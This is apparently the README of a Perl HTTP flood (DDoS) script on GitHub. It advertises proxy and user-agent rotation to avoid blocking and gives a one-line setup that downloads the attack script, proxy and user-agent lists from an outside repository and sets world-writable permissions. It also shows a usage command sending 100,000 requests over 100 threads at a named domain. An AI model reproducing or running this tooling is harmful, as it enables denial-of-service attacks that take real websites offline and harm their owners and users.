
# Script for HTTP DDoS Attack (Custom Modification) ↓

## Features

- Send request with Random User-agent, Read user-agent from Local file, With Proxy
- multi-threading
- Basic Perl script
- Url Path, Threads, Number of Request,GET-POST, rate-limit, timeout (Customization)
- customizable Headers
- Easy to Customize for beginners
- Define Number of request to be send to target
- Can modify Delay btween next request
- Can be used with or without Proxy
- Language: Perl
- Just to understand workflow!





## Installation

One Line Setup for Debian Based distro ~ Ubuntu, Debian

```bash
apt update -y && apt install perl -y && apt install wget -y && wget https://raw.githubusercontent.com/cyberceros/ddos-dose/main/Layer7/HTTP-DDoS/HTTP-SIMPLE-CUSTOM%20%7C%20ID%3A2A/http.pl && wget https://raw.githubusercontent.com/cyberceros/ddos-dose/main/Layer7/HTTP-DDoS/HTTP-SIMPLE%20%7C%20ID%3A1A/user.txt && wget https://raw.githubusercontent.com/cyberceros/ddos-dose/main/Layer7/HTTP-DDoS/HTTP-SIMPLE-CUSTOM%20%7C%20ID%3A2A/proxy.txt && yes | perl -MCPAN -e'install "LWP::Simple"' && yes | apt-get install libwww-perl && chmod 777 *

```
## Usage

```
perl http.pl --url http://dultr.in/ --urlpath / --threads 100 --num_requests 100000 --method GET --rate_limit 10 --timeout 10 --proxy_list proxies.txt --user_agents user.txt 
perl http.pl --url <url> --urlpath <path> --threads <no_of_threads> --num_requests <no_of_req> --method <req_method> --rate_limit <rate_limit time> --timeout <proxy connection timeout time> --proxy_list <path of proxy file> --user_agents <path of user-agent file> 
```
```
---> Script Read User-agent from a file "user.txt" or proxy from "proxy.txt" in same dir, if not 
present it's automatically run with a specif user-agent or using instance except proxy.
```
```
-> (Line80) -> Add/Remove Headers.
-> Other parameters are being passed with command, you can customize that. 
```

## Check this Script Also for better Understanding ->

Click Below ↓

[Click Here for that Script](https://github.com/cyberceros/ddos-dose/tree/main/Layer7/HTTP-DDoS/HTTP-SIMPLE%20%7C%20ID:1A)


## Authors

- [@cyberceros](https://www.github.com/cyberceros)
## Feedback

If you have any feedback, please reach out to us at n@dultr.in
